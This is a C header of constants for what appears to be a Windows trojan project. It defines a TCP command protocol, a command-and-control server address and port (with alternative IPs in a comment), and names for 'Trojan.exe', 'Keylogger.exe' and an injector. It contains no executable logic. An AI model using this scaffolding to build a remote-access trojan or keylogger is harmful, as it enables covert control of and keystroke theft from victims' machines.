#pragma once

#ifndef __CONSTANTS_H_INCLUDED__
#define __CONSTANTS_H_INCLUDED__

#include <tchar.h>

#define SMALL_BUFFER_LENGTH     256

// TCP protocol defines
#define CMD_LENGTH         2
#define ARGS_LENGTH        126
#define TCP_MESSAGE_LENGTH 128

#define SERVER_IP          "127.0.0.1" // "37.190.32.12" "127.0.0.1" "192.168.1.65"
#define DEFAULT_PORT       20000

#define TROJAN_APP_NAME    TEXT("Trojan.exe")

// Commands defines
#define NUMBER_OF_COMMANDS  3

#define TASK_SUCCESSP       TEXT("Success")
#define TASK_SUCCESSW       L"Success"
#define TASK_SUCCESSA        "Success"
#define TASK_SUCCESS_LENGTH 7

#define TASK_FAILUREP       TEXT("Failure")
#define TASK_FAILUREW       L"Failure"
#define TASK_FAILUREA        "Failure"
#define TASK_FAILURE_LENGTH 7

#define UNDEFINEDP          TEXT("Undefined")
#define UNDEFINEDW          L"Undefined"
#define UNDEFINEDA           "Undefined"
#define UNDEFINED_LENGTH    9

#define RESULT_LENGTH       256

// Injector defines
#define PATH_LENGTH 256

// Keylogger defines
#define KEYLOGGER_APP_NAME      TEXT("Keylogger.exe")
#define KEYLOGGER_BUFFER_LENGTH 64
#define KEYBOARD_STATE_SIZE     256

#endif /* __CONSTANTS_H_INCLUDED__ */